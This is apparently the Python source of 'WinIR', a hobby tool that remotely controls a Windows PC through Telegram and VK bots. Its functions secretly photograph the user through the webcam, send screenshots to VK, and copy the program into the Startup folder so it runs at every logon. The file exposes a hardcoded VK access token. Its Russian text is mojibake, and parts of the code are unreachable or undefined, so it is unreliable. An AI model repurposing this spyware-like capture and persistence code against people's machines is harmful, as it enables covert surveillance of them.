#libraries
import os,json,datetime,requests,vk_api,random,getpass,shutil,sys,re,psutil
from vk_api import VkUpload
from PIL import Image, ImageGrab#pip install Pillow
import winsound#sound
import threading#–º–Ω–æ–≥–æ–ø–æ—Ç–æ—á–Ω–æ—Å—Ç—å
from tkinter import*
import __main__#link to file
from vk_api.keyboard import VkKeyboard, VkKeyboardColor#vk_api keyboard
from vk_api.bot_longpoll import VkBotEventType, VkBotLongPoll#util
from datetime import datetime, date, timedelta#date
from bs4 import BeautifulSoup as bs#parsing
from vk_api.longpoll import VkLongPoll, VkEventType#util
from vk_api.utils import get_random_id#util
import cv2#camera pip install opencv-python
import sounddevice as sd
import soundfile as sf
from win32 import win32gui
#from win32gui import GetWindowText, GetForegroundWindow#active apps
import pyttsx3#–≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ —Ç–µ–∫—Å—Ç–∞
import time
import numpy as np
import platform 
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, KeyboardButton, ReplyKeyboardMarkup
#def's
def file_opening(nomination):#–æ—Ç–∫—Ä—ã—Ç–∏–µ —è—Ä–ª—ã–∫–æ–≤(–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π) –∏–∑ —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞
    os.startfile(r'C:\Users\{name1}\Desktop\{name2}'.format(name1=USER_NAME,name2=str(nomination)))

    
def working_time(start_time):#–≤—ã–≤–æ–¥ –≤—Ä–µ–º–µ–Ω–∏ —Ä–∞–±–æ—Ç—ã –ø–∫ —Å –Ω–∞—á–∞–ª–∞ –≤–∫–ª—é—á–µ–Ω–∏—è
    end_time = time.monotonic()
    return timedelta(seconds=end_time - start_time)

    
def text_speaker(text):#–≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ —Ç–µ–∫—Å—Ç–∞ –Ω–∞ –¥–∏–Ω–∞–º–∏–∫–∞—Ö
    engine=pyttsx3.init()
    engine.say(text)
    engine.runAndWait()

    

def write_msg(user_id, s):#–æ—Ç–ø—Ä–∞–≤–∫–∞ —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è
    vk_session.method('messages.send', {'user_id':user_id,'message':s,"random_id":random.randint(1, 100)})
    
       
def time_msg(profile_id):#–æ—Ç–ø—Ä–∞–≤–∫–∞ –≤—Ä–µ–º–µ–Ω–∏ –≤–∫–ª—é—á–µ–Ω–∏—è –ø–∫
    global start_time,time_now
    start_time = time.monotonic()
    date_now=date.today().strftime("%d.%m.%y")
    time_now=datetime.today().strftime("%H:%M")
    time_message='–ö–æ–º–ø—å—é—Ç–µ—Ä –≤–∫–ª—é—á–µ–Ω '+str(date_now)+' –≤ '+str(time_now)
    vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=static_board.get_keyboard(),message=time_message)


def resurs_monitor():#–≤–∑—è—Ç–∏–µ –ø–æ–∫–∞–∑–∞–Ω–∏–π –∑–∞–≥—Ä—É–∑–∫–∏ –¶–ü(8 —Å–µ–∫—É–Ω–¥) –∏ –∑–∞–≥—Ä—É–∑–∫–∏ –û–ü(–æ–¥–Ω–æ–∫—Ä–∞—Ç–Ω–æ)
    deadtime=time.monotonic()+8
    cpu_mass=[]
    while time.monotonic()<deadtime:
        cpu_mass.append(psutil.cpu_percent())
    feel=None
    if round(np.mean(cpu_mass))>80:
        feel="—Å–∏–ª—å–Ω–∞—è"
    elif round(np.mean(cpu_mass))<80 and round(np.mean(cpu_mass))>30:
        feel="–Ω–æ—Ä–º–∞–ª—å–Ω–∞—è"
    else:
        feel="—Å–ª–∞–±–∞—è"
        
        
    vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=static_board.get_keyboard(),message=f'''–∑–∞–≥—Ä—É–∑–∫–∞ —Ü–ø: {round(np.mean(cpu_mass))}%,
 –∑–∞–≥—Ä—É–∑–∫–∞ –ø–∞–º—è—Ç–∏: {psutil.virtual_memory()[2]}%.
 –Ω–∞–≥—Ä—É–∑–∫–∞ –Ω–∞ —Å–∏—Å—Ç–µ–º—É: {feel}
 ''')

    
def msg_root(event):#–≤—ã–≤–æ–¥ —Ç–µ–∫—Å—Ç–∞ –Ω–∞ —ç–∫—Ä–∞–Ω –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è 
    root_text=event.text.lower()
    root=Tk()
    root.title("WinIR-–¥–∏—Å—Ç–∞–Ω—Ü–∏–æ–Ω–Ω–æ–µ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ")
    root.geometry("3000x2500")
    lab=Label(root,text=root_text,font="Arial 16")
    root.call('wm', 'attributes', '.', '-topmost', '1')    
    lab.pack()
    root.mainloop()


def add_to_startup(USER_NAME,file_path=""):
    if file_path=="":
        file_path = __main__.__file__
    b=file_path.split("WinIR.pyw")#####error without real name#####
    filee=b[0]+"WinIR.exe"
    path_txt=b[0]+"recover.json"
    syspath = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    #shutil.move(path_txt,syspath)#–ø–µ—Ä–µ–º–µ—â–∞–µ–º  .json  –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
    shutil.move(filee,syspath)#–ø–µ—Ä–µ–º–µ—â–∞–µ–º  .exe  –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
    

def get_exe():
    files_mass=[]
    file_path=r'C:\Users\%s\Desktop'% USER_NAME
    files=os.listdir(file_path)
    for file in files:
        if '.' in file:
            files_mass.append(file)
    return files_mass
            
    
def getUserName(link):
    user_get=vk.users.get(user_ids = (link))
    user_get=user_get[0]
    first_name=user_get['first_name']
    last_name=user_get['last_name']
    full_name=first_name+" "+last_name
    return first_name,last_name
        
        
def getUserId(link):
    ids = link
    if 'vk.com/' in link: #–ø—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ —Å—Å—ã–ª–∫—É
        ids = link.split('/')[-1]  # –µ—Å–ª–∏ –µ—Å—Ç—å, —Ç–æ –ø–æ–ª—É—á–∞–µ–º –µ–≥–æ –ø–æ—Å–ª–µ–¥–Ω—é—é —á–∞—Å—Ç—å
    if not ids.replace('id', '').isdigit(): # –µ—Å–ª–∏ –≤ –Ω–µ–º –ø–æ—Å–ª–µ –æ—Ç—Å–µ—á–µ–Ω–∏—è 'id' —Å–∞–º–∏ —Ü–∏—Ñ—Ä—ã - —ç—Ç–æ –∏ –µ—Å—Ç—å id 
        ids = vk.utils.resolveScreenName(screen_name=ids)['object_id'] # –µ—Å–ª–∏ –Ω–µ—Ç, –ø–æ–ª—É—á–∞–µ–º id —Å –ø–æ–º–æ—â—å—é –º–µ—Ç–æ–¥–∞ API
    else:
        ids = ids.replace('id', '')
        
    return ids




def error_msg(profile_id):
    vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=static_board.get_keyboard(),message='—ç—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –∏–∑-–∑–∞ –ø–ª–æ—Ö–æ–≥–æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º.–ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É...')

def camera():
    time.sleep(2)
    cap = cv2.VideoCapture(0)
    for i in range(30):
        cap.read()   
    ret,frame = cap.read()
    image='cam_photo.png'
    cv2.imwrite(image, frame)   
    cap.release()
    upload=VkUpload(vk_session)
    attachments=[]
    upload_image=upload.photo_messages(photos=image)[0]
    attachments.append("photo{}_{}".format(upload_image['owner_id'],upload_image['id']))   
    vk_session.method('messages.send', {'user_id':profile_id,'message':None,"random_id":random.randint(1, 100),"attachment":','.join(attachments)})
    os.remove(image)
    

def screenshot():
    time.sleep(2)
    img = ImageGrab.grab()
    image='scr_photo.png'
    img.save(image, "PNG")                              
    upload=VkUpload(vk_session)
    attachments=[]
    upload_image=upload.photo_messages(photos=image)[0]                  
    attachments.append("photo{}_{}".format(upload_image['owner_id'],upload_image['id']))   
    vk_session.method('messages.send', {'user_id':profile_id,'message':None,"random_id":random.randint(1, 100),"attachment":','.join(attachments)})
    os.remove(image)

    
    
def secondary_main(token, id_admin, turn_on):#–≤—Å–µ–≥–¥–¥–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Å–ª–æ–≤–æ ""
    bot=telebot.TeleBot(token)
    @bot.message_handler(commands=['notify_on'])
    def start_message(message):
        try:
            USER_NAME = getpass.getuser()
            redirect="recover.json"
            file_path=os.path.dirname(os.path.realpath(__main__.__file__))#link to startup
            json_path=f"{file_path}\{redirect}"#link to .json file
            info_list={
                'token':token,
                'id_admin':id_admin,
                'notification_status': True,
                'turn_on': turn_on+1           
                }
                           
            with open(json_path,"w") as file:
                json.dump(info_list,file,indent=2,ensure_ascii=False)#–∑–∞–ø–∏—Å—å id –≤ .json
            
        except Exception as a:
            print(a)

        else:
            print("1")
            bot.send_message(id_admin,"–£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –±—ã–ª–∏ –≤–∫–ª—é—á–µ–Ω—ã. –î–ª—è –≤—ã–∫–ª—é—á–µ–Ω–∏—è –≤–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É /notify_off")
            bot.stop_polling()
            main(token, id_admin, turn_on)

    bot.polling()


    
def main(token, id_admin, turn_on):    
    global sound_stat
    
    #system variables
    file_path=os.path.dirname(os.path.realpath(__main__.__file__))#link to startup
    cam_path=f"{file_path}\screen.png"
    screen_path=f"{file_path}\cam.png"
    try:
        os.remove(cam_path)#–ø—Ä–æ–≤–µ—Ä–∫–∞ –∏ —É–¥–∞–ª–µ–Ω–∏–µ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–π
    except:
        pass
    try:
        os.remove(screen_path)#–ø—Ä–æ–≤–µ—Ä–∫–∞ –∏ —É–¥–∞–ª–µ–Ω–∏–µ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–π
    except:
        pass
    
    bot=telebot.TeleBot(token)
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = KeyboardButton("–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µüöÄ")
    btn2 = KeyboardButton("–†–∞–±–æ—Ç–∞ —Å —Ñ–∞–π–ª–∞–º–∏üìÅ")
    btn3 = KeyboardButton("–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–∏—Ç–∞–Ω–∏–µ–ºüîã")
    btn4 = KeyboardButton("–°–≤–µ–¥–µ–Ω–∏—è –∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è‚Ñπ")
    btn5 = KeyboardButton("–ù–∞—Å—Ç—Ä–æ–π–∫–∏‚öô")
    markup.add(btn1, btn2, btn3, btn4, btn5)
    markup_functional = ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = KeyboardButton("–ó–≤—É–∫–æ–≤–æ–µ –æ–ø–æ–≤–µ—â–µ–Ω–∏–µ")
    btn2 = KeyboardButton("–í—ã–≤–æ–¥ —Ç–µ–∫—Å—Ç–∞")
    btn3 = KeyboardButton("–í–µ–±-–∫–∞–º–µ—Ä–∞")
    btn4 = KeyboardButton("–°–æ–∑–¥–∞–Ω–∏–µ –æ–∫–Ω–∞")
    btn5 = KeyboardButton("–í–µ–±-–∫–∞–º–µ—Ä–∞")
    btn6 = KeyboardButton("–û—Ç–∫—Ä—ã—Ç–∏–µ —Ñ–∞–π–ª–æ–≤/–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π")
    btn_newpage = KeyboardButton("–°–ª–µ–¥. —Å—Ç—Ä–∞–Ω–∏—Ü–∞‚û°Ô∏è")
    btn_exit = KeyboardButton("–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—éüîô")
    markup_functional.add(btn1, btn2, btn3, btn4, btn5, btn6, btn_exit, btn_newpage)
    start_time = time.monotonic()
    date_now=date.today().strftime("%d.%m.%y")
    time_now=datetime.today().strftime("%H:%M")
    time_message='–ö–æ–º–ø—å—é—Ç–µ—Ä –≤–∫–ª—é—á–µ–Ω '+str(date_now)+' –≤ '+str(time_now)
    bot.send_message(id_admin,time_message,reply_markup=markup)
    
    
    @bot.callback_query_handler(func=lambda call: True)
    def callback_query(call):
        if call.data == " ":
            pass

        
    menu_stat=False
    sound_stat=False
    @bot.message_handler(content_types=['text'])
    def get_text_messages(message):
        global menu_stat, sound_stat
        ######################################################################################################
        if message.text.lower() == "—É–ø—Ä–∞–≤–ª–µ–Ω–∏–µüöÄ" or message.text.lower() == "—É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ":
            bot.send_message(id_admin,"–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ –Ω–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–µ:", reply_markup=markup_functional)
            menu_stat="control"
            
        elif message.text.lower() == "—Å–ª–µ–¥. —Å—Ç—Ä–∞–Ω–∏—Ü–∞‚û°Ô∏è" and menu_stat=="control":
            bot.send_message(id_admin, "–ù–æ–≤—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ —Ç–æ–ª—å–∫–æ —Ä–∞–∑—Ä–∞–±–∞—Ç—ã–≤–∞—é—Ç—Å—è, —Å–ª–µ–¥–∏—Ç–µ –∑–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è–º–∏!")



        elif message.text.lower() == "–∑–≤—É–∫–æ–≤–æ–µ –æ–ø–æ–≤–µ—â–µ–Ω–∏–µ":
            markup_exit = ReplyKeyboardMarkup(resize_keyboard=True)
            btn_exit = KeyboardButton("–û—Ç–º–µ–Ω–∞")
            markup_exit.add(btn_exit)
            bot.send_message(id_admin, "–í–≤–µ–¥–∏—Ç–µ –≤—Ä–µ–º—è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –∑–≤—É–∫–æ–≤–æ–≥–æ —Å–∏–≥–Ω–∞–ª–∞(–≤ —Å–µ–∫—É–Ω–¥–∞—Ö)", reply_markup=markup_exit)
            sound_stat=True
            
        elif menu_stat=="control" and sound_stat==True and message:
            try:
                if message.text.lower()=="–æ—Ç–º–µ–Ω–∞":
                    bot.send_message(id_admin, "–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ. –í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ –Ω–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–µ:", reply_markup=markup_functional)
                    
                elif int(message.text.lower())<=10 and int(message.text.lower())>0:
                    winsound.Beep(500,int(message.text.lower())*1000)
                    bot.send_message(id_admin, f'–ë—ã–ª –ø—Ä–æ–∏–∑–≤–µ–¥—ë–Ω –≥—É–¥–æ–∫ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å—é: {message.text} —Å–µ–∫.', reply_markup=markup_functional)

                elif int(message.text.lower())<0:
                    bot.send_message(id_admin, f'–í—Ä–µ–º—è {message.text} –æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω–æ! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â—ë —Ä–∞–∑', reply_markup=markup_functional)

                elif int(message.text.lower())==0:
                    bot.send_message(id_admin, '–í—Ä–µ–º—è –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –Ω—É–ª–µ–≤—ã–º! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â—ë —Ä–∞–∑', reply_markup=markup_functional)
                    
                elif int(message.text.lower())>10:
                    bot.send_message(id_admin, '–ì—É–¥–∫–∏ –±–æ–ª—å—à–µ 10 —Å–µ–∫. –±–æ—Ç –Ω–µ –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç!', reply_markup=markup_functional)
                        
                sound_stat=False
            except ValueError:
                bot.send_message(id_admin, '–í—ã –≤–≤–µ–ª–∏ –Ω–µ —á–∏—Å–ª–æ! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â—ë —Ä–∞–∑', reply_markup=markup_functional)
                sound_stat=False

        ######################################################################################################
        elif message.text.lower() == "—Ä–∞–±–æ—Ç–∞ —Å —Ñ–∞–π–ª–∞–º–∏üìÅ" or message.text.lower() == "—Ä–∞–±–æ—Ç–∞ —Å —Ñ–∞–π–ª–∞–º–∏":
            markup = ReplyKeyboardMarkup(resize_keyboard=False)
            btn1 = KeyboardButton("–ó–≤—É–∫–æ–≤–æ–µ –æ–ø–æ–≤–µ—â–µ–Ω–∏–µ")
            btn2 = KeyboardButton("–í—ã–≤–æ–¥ —Ç–µ–∫—Å—Ç–∞")
            btn3 = KeyboardButton("–í–µ–±-–∫–∞–º–µ—Ä–∞")
            btn4 = KeyboardButton("–°–æ–∑–¥–∞–Ω–∏–µ –æ–∫–Ω–∞")
            btn5 = KeyboardButton("–í–µ–±-–∫–∞–º–µ—Ä–∞")
            btn6 = KeyboardButton("–û—Ç–∫—Ä—ã—Ç–∏–µ —Ñ–∞–π–ª–æ–≤/–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π")
            btn_newpage = KeyboardButton("–°–ª–µ–¥. —Å—Ç—Ä–∞–Ω–∏—Ü–∞")
            btn_exit = KeyboardButton("–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—éüîô")
            markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn_exit, btn_newpage)
            bot.send_message(id_admin,"–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ –Ω–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–µ:",reply_markup=markup)
        ######################################################################################################
          
        elif message.text.lower() == "—É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–∏—Ç–∞–Ω–∏–µ–ºüîã" or message.text.lower() == "—É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–∏—Ç–∞–Ω–∏–µ–º":
            markup = ReplyKeyboardMarkup(resize_keyboard=True)
            btn1 = KeyboardButton("Power offüõë")
            btn2 = KeyboardButton("RestartüîÉ")
            btn3 = KeyboardButton("Sleep modeüí§")
            btn_exit = KeyboardButton("–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—éüîô")
            markup.add(btn1, btn2, btn3, btn_exit)
            bot.send_message(id_admin,"–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ –Ω–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–µ:",reply_markup=markup)
        ######################################################################################################
        elif message.text.lower() == "—Å–≤–µ–¥–µ–Ω–∏—è –∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è‚Ñπ" or message.text.lower() == "—Å–≤–µ–¥–µ–Ω–∏—è –∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è":
            markup = ReplyKeyboardMarkup(resize_keyboard=True)
            btn1 = KeyboardButton("–ó–≤—É–∫–æ–≤–æ–µ –æ–ø–æ–≤–µ—â–µ–Ω–∏–µ")
            btn2 = KeyboardButton("–í—ã–≤–æ–¥ —Ç–µ–∫—Å—Ç–∞")
            btn3 = KeyboardButton("–í–µ–±-–∫–∞–º–µ—Ä–∞")
            btn4 = KeyboardButton("–°–æ–∑–¥–∞–Ω–∏–µ –æ–∫–Ω–∞")
            btn5 = KeyboardButton("–í–µ–±-–∫–∞–º–µ—Ä–∞")
            btn6 = KeyboardButton("–û—Ç–∫—Ä—ã—Ç–∏–µ —Ñ–∞–π–ª–æ–≤/–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π")
            btn_newpage = KeyboardButton("–°–ª–µ–¥. —Å—Ç—Ä–∞–Ω–∏—Ü–∞")
            btn_exit = KeyboardButton("–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—éüîô")
            markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn_exit, btn_newpage)
            bot.send_message(id_admin,"–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ –Ω–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–µ:",reply_markup=markup)
        ######################################################################################################
        elif message.text.lower() == "–Ω–∞—Å—Ç—Ä–æ–π–∫–∏‚öô" or message.text.lower() == "–Ω–∞—Å—Ç—Ä–æ–π–∫–∏":
            markup = ReplyKeyboardMarkup(resize_keyboard=True)
            btn1 = KeyboardButton("–ó–≤—É–∫–æ–≤–æ–µ –æ–ø–æ–≤–µ—â–µ–Ω–∏–µ")
            btn2 = KeyboardButton("–í—ã–≤–æ–¥ —Ç–µ–∫—Å—Ç–∞")
            btn3 = KeyboardButton("–í–µ–±-–∫–∞–º–µ—Ä–∞")
            btn4 = KeyboardButton("–°–æ–∑–¥–∞–Ω–∏–µ –æ–∫–Ω–∞")
            btn5 = KeyboardButton("–í–µ–±-–∫–∞–º–µ—Ä–∞")
            btn6 = KeyboardButton("–û—Ç–∫—Ä—ã—Ç–∏–µ —Ñ–∞–π–ª–æ–≤/–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π")
            btn_newpage = KeyboardButton("–°–ª–µ–¥. —Å—Ç—Ä–∞–Ω–∏—Ü–∞")
            btn_exit = KeyboardButton("–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—éüîô")
            markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn_exit, btn_newpage)
            bot.send_message(id_admin,"–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ –Ω–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–µ:",reply_markup=markup)



        elif message.text.lower()== "–≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—éüîô" or message.text.lower() == "–≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é":
            markup = ReplyKeyboardMarkup(resize_keyboard=True)
            btn1 = KeyboardButton("–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µüöÄ")
            btn2 = KeyboardButton("–†–∞–±–æ—Ç–∞ —Å —Ñ–∞–π–ª–∞–º–∏üìÅ")
            btn3 = KeyboardButton("–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–∏—Ç–∞–Ω–∏–µ–ºüîã")
            btn4 = KeyboardButton("–°–≤–µ–¥–µ–Ω–∏—è –∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è‚Ñπ")
            btn5 = KeyboardButton("–ù–∞—Å—Ç—Ä–æ–π–∫–∏‚öô")
            markup.add(btn1, btn2, btn3, btn4, btn5)
            bot.send_message(id_admin,"–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ –Ω–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–µ:",reply_markup=markup)

    bot.polling()
    #variables from vk_api
    vk_session = vk_api.VkApi(token='24ad85b542c917f1cadf8aebdc640f6e6e0b090e32f88798e9ccb7ded37edea5f194efddf8f50875014c2')
    longpoll = VkLongPoll(vk_session)
    vk = vk_session.get_api()
    
    #keyboard
    medium = VkKeyboard(one_time=False)
    medium.add_line()
    
    keyboard_yes_no = VkKeyboard(one_time=False)
    keyboard_yes_no.add_button('–¥–∞', color=VkKeyboardColor.PRIMARY)
    keyboard_yes_no.add_line()
    keyboard_yes_no.add_button('–Ω–µ—Ç', color=VkKeyboardColor.POSITIVE)


    #keyboard "–º–µ–Ω—é —Ñ—É–Ω–∫—Ü–∏–π"
    keyboard = VkKeyboard(one_time=False)
    keyboard.add_button('–°–æ–∑–¥–∞–Ω–∏–µ –æ–∫–Ω–∞', color=VkKeyboardColor.POSITIVE)
    keyboard.add_button('–ê–∫—Ç–∏–≤–Ω—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è', color=VkKeyboardColor.POSITIVE)
    keyboard.add_line()    
    keyboard.add_button('–í–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ —Ç–µ–∫—Å—Ç–∞', color=VkKeyboardColor.POSITIVE)
    keyboard.add_line()
    keyboard.add_button('–°–∫—Ä–∏–Ω—à–æ—Ç', color=VkKeyboardColor.POSITIVE)
    keyboard.add_button('–ì—É–¥–æ–∫', color=VkKeyboardColor.POSITIVE)
    keyboard.add_button('–ö–∞–º–µ—Ä–∞', color=VkKeyboardColor.POSITIVE)
    keyboard.add_line()
    keyboard.add_button('–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', color=VkKeyboardColor.NEGATIVE)
    keyboard.add_line()
    keyboard.add_button('–°–ª–µ–¥. —Å—Ç—Ä–∞–Ω–∏—Ü–∞')    

    #keyboard_one "–º–µ–Ω—é –Ω–∞–∑–∞–¥"
    keyboard_one = VkKeyboard(one_time=True)
    keyboard_one.add_button('–ù–∞–∑–∞–¥', color=VkKeyboardColor.POSITIVE)
    


    #static_board "–æ—Å–Ω–æ–≤–Ω–æ–µ –º–µ–Ω—é"
    static_board = VkKeyboard(one_time=False)
    static_board.add_button("–§—É–Ω–∫—Ü–∏–∏",color=VkKeyboardColor.POSITIVE)
    static_board.add_line()
    static_board.add_button("–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞",color=VkKeyboardColor.PRIMARY)
    static_board.add_line()
    static_board.add_button("–°–∏—Å—Ç–µ–º–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏",color=VkKeyboardColor.NEGATIVE)
    static_board.add_line()
    static_board.add_button("–°–ª–µ–¥. —Å—Ç—Ä–∞–Ω–∏—Ü–∞")
    
    #static_board2 "–æ—Å–Ω–æ–≤–Ω–æ–µ –º–µ–Ω—é"
    keyboard2 = VkKeyboard(one_time=False)
    keyboard2.add_button("–í—ã–∫–ª—é—á–µ–Ω–∏–µ",color=VkKeyboardColor.POSITIVE)
    keyboard2.add_button("–ú–æ–Ω–∏—Ç–æ—Ä —Ä–µ—Å—É—Ä—Å–æ–≤",color=VkKeyboardColor.POSITIVE)
    keyboard2.add_line()
    keyboard2.add_button('–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', color=VkKeyboardColor.NEGATIVE)
    keyboard2.add_line()
    keyboard2.add_button('–ü—Ä–µ–¥. —Å—Ç—Ä–∞–Ω–∏—Ü–∞')

    #system_board "–æ—Å–Ω–æ–≤–Ω–æ–µ –º–µ–Ω—é"
    system_board = VkKeyboard(one_time=False)
    system_board.add_button('–ü–µ—Ä–µ–∑–∞–ø–∏—Å—å id', color=VkKeyboardColor.PRIMARY)
    system_board.add_line()
    system_board.add_button('–í—ã–∫–ª—é—á–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è', color=VkKeyboardColor.PRIMARY)
    system_board.add_line()
    #system_board.add_openlink_button('–ü–µ—Ä–µ–∫–ª—é—á–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è', 'https://www.youtube.com/watch?v=W87VM-p446c')
    #system_board.add_line()
    system_board.add_openlink_button('—Ç–µ—Å—Ç–æ–≤–∞—è –∫–Ω–æ–ø–∞', 'https://www.youtube.com/watch?v=W87VM-p446c')
    system_board.add_line()
    system_board.add_button("–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é", color=VkKeyboardColor.NEGATIVE)

    #system_notification_board "–æ—Å–Ω–æ–≤–Ω–æ–µ –º–µ–Ω—é"
    system_notification_board = VkKeyboard(one_time=False)
    system_notification_board.add_button('–ù–∞ –≤—Ä–µ–º—è', color=VkKeyboardColor.PRIMARY)
    system_notification_board.add_line()
    system_notification_board.add_button('–ù–∞–≤—Å–µ–≥–¥–∞', color=VkKeyboardColor.PRIMARY)
    system_notification_board.add_line()
    system_notification_board.add_button("–ù–∞–∑–∞–¥", color=VkKeyboardColor.NEGATIVE)

 
    try:
        add_to_startup()
        
    except:
        pass
    
    try:  
        with open(appdata_path) as file:#–ø—É—Ç—å –¥–æ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
            profile_id=json.load(file)["profile_id"]
        
            
    except:#file not found
        pass

    else:#try –ø—Ä–æ—à—ë–ª(.json –Ω–∞–π–¥–µ–Ω)
        
        with open(appdata_path,'r') as file:#–ø—É—Ç—å –¥–æ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
            times=int(json.load(file)["turn_on"])

        person_info=[]
        name_1=getUserName(profile_id)[0]
        name_2=getUserName(profile_id)[1]
        profile_ids=str(getUserId(profile_id))
        with open(appdata_path) as file:#–ø—É—Ç—å –¥–æ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
            notification_status=bool(json.load(file)["notification_status"])

        
        
        info_list={
            'notification_status':notification_status,
            'first_name':name_1,
            'second_name':name_2,
            'profile_id':profile_ids,
            'turn_on':times+1
        
            }
                       
        person_info.append(info_list)
        with open(appdata_path,"w") as file:
            json.dump(info_list,file,indent=2,ensure_ascii=False)#–∑–∞–ø–∏—Å—å id –≤ .json


        new_list_status=False
        for event in longpoll.listen():
            try:
                if event.type == VkEventType.MESSAGE_NEW and event.text: 
                    if event.text.lower()=="—Ñ—É–Ω–∫—Ü–∏–∏":
                        print("fun")
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='–ú–µ–Ω—é —Ñ—É–Ω–∫—Ü–∏–∏ –±–æ—Ç–∞:')
                        new_list_status=True


